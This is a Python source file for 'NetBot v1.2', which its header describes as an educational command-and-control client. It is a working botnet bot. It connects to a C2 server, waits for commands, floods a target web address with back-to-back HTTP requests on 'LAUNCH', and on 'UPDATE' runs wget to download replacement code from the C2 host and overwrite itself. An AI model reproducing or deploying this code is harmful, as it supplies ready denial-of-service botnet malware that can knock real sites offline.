#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.2
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used only for educational, research purposes and internal use only.
#

import socket
import time
import threading
import time
#import requests
import os
import urllib.request



class launchAttack:
      
	def __init__(self):
		self._running = True
      
	def terminate(self):
		self._running = False
      
	def run(self, n):
		while self._running and attackSet:
			#r = requests.get("http://192.168.0.151/")
			u = urllib.request.urlopen("http://192.168.0.151/").read()
			time.sleep(0)


def Main():

	#Flags
	global attackSet
	attackSet = 0
	global updated
	updated = 0


	host = '192.168.0.174' # NetBot CCC Server
	port = 5555 # NetBot CCC Port

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Establishing a TCP Connection
	try:
		s.connect((host,port)) # Connect to the CCC Server
		message = "HEARTBEAT" # Sends Alive Pings to CCC Server
		
	except:
		print("CCC Server not online. Retrying every 15 seconds...")
		updated = 0
		time.sleep(15)
		Main()
		
	while True:

		# message sent to server
		try:
			s.send(message.encode()) # use a try catch 	

		except:
			Main()
		# message received from server
		data = s.recv(1024)

		# print the received message
		print('CCC Response:',str(data.decode()))
		
		data = str(data.decode())
		
		if data == "LAUNCH":
			if attackSet == 0:
				# start a new thread and start the attack (create a new process)
				attackSet = 1
				c = launchAttack()
				t = threading.Thread(target = c.run, args =(10, ))
				t.start()
				
			else:
				time.sleep(15)
				if t.is_alive():
					print('Attack in Progress...')
			#else: 
			continue
		elif data == "HALT":
			attackSet = 0
			time.sleep(30)
			continue
		elif data == "HOLD":
			attackSet = 0
			print('Waiting for Instructions from CCC. Retrying in 30 seconds...')
			time.sleep(30)
		elif data == "UPDATE":
			if updated == 0:
				attackSet = 0
				os.system('wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1')
				print('Client Libraries Updated')
				updated = 1
				time.sleep(30)
			else:
				time.sleep(30)
		else:
			attackSet = 0
			print('Command Server Offline. Retrying in 30 seconds...')
			updated = 0
			time.sleep(30)
	# close the connection
	s.close()

if __name__ == '__main__':
	Main()
